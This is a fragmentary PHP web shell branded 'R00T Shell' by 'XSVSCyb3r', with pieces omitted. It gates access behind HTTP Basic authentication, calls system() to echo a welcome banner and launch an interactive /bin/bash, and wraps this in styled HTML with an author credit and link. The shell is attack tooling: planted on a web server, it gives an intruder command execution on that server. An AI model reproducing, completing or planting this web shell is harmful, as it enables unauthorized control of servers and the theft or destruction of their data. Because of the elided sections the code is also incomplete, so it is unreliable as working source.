...
if(!isset($PHP_AUTH_USER))
  {
  Header('WWW-Authenticate: Basic realm="r00tshell"');
...
system(\"echo Welcome To R00T Shell && /bin/bash -i\");
else
...
<font face=Webdings size=6><b>!</b></font><b>&nbsp;&nbsp;r00tshell</b>
</font>
</td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
...
<tr><td bgcolor=#cccccc>
<?
echo "<div align=center><font face=Verdana size=-2><b>o---[ R00T Shell - By XSVSCyb3r | <a href=https://nainsec.pro.net>nainsec.pro.net</a> | Vers 1 ]---o</b></font></div>";
?>
</td></tr></table>
...
width="1" height="1" alt=""></a></noscript>
